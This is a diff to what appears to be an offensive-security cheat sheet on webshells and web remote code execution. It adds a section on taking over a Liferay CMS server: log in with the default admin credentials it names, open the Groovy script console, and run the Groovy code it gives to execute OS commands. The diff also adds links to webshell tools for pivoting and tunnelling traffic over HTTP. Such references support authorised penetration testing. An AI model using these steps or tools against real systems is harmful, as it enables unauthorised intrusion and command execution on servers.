@@ -28,7 +28,8 @@ I. Classic Webshell upload techniques
 II. Classic Web RCE techniques
     ➤ Technique 1. RCE using an IBM Domino Web administration console
     ➤ Technique 2. RCE using a Jenkins web-based groovy script console
-    ➤ Technique 3. ...
+    ➤ Technique 3. RCE using a Liferay CMS web-based groovy script console
+    ➤ Technique 4. ...
 
 III. List of common paths for the DocumentRoot directory (Web root folder)
 
@@ -614,6 +615,23 @@ Note: Several PHP functions can be used in a webshell to execute OS commands suc
 	   - print "ls /".execute().text					//for a Linux server
 ```
 
+#### Technique 3 - RCE using a Liferay CMS web-based groovy script console
+```
+➤ Step 1. Log into a Liferay CMS Web portal with admin privileges (e.g. default admin credentials 'test@liferay.com:test')
+
+➤ Step 2. Browse the Liferay web-based groovy script console that allows to execute OS commands on the underlying server (windows or linux).
+	   - Location: Control Panel > Server Administration > Script
+	   - URL: https://LIFERY-CMS-URL/group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_mvcRenderCommandName=%2Fserver_admin%2Fview&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1=script
+
+➤ Step 3. Execute OS command using the groovy script console
+           - Basic example of code to enter in the groovy script box to execute the 'whoami' command if the Liferay is running on a Linux server
+		def sout = new StringBuilder(), serr = new StringBuilder()
+		def proc = 'whoami'.execute()
+		proc.consumeProcessOutput(sout, serr)
+		proc.waitForOrKill(1000)
+		println "out> $sout err> $serr"
+```
+
 -----------------
 
 ### III. List of common paths for the DocumentRoot directory (Web root folder)
@@ -651,6 +669,9 @@ Note: Several PHP functions can be used in a webshell to execute OS commands suc
 | Nodejs | https://github.com/Zibri/wshell3 |
 | Multiple types | https://github.com/EatonChips/wsh |
 | Multiple types | https://github.com/hosch3n/msmap |
+| Webshell for pivoting (TCP tunnelling over HTTP) | https://github.com/blackarrowsec/pivotnacci |
+| Webshell for pivoting (TCP tunnelling over HTTP) | https://github.com/L-codes/Neo-reGeorg |
+| Webshell for pivoting (TCP tunnelling over HTTP) | https://github.com/SecarmaLabs/chunkyTuna |
 
 -----------------
 
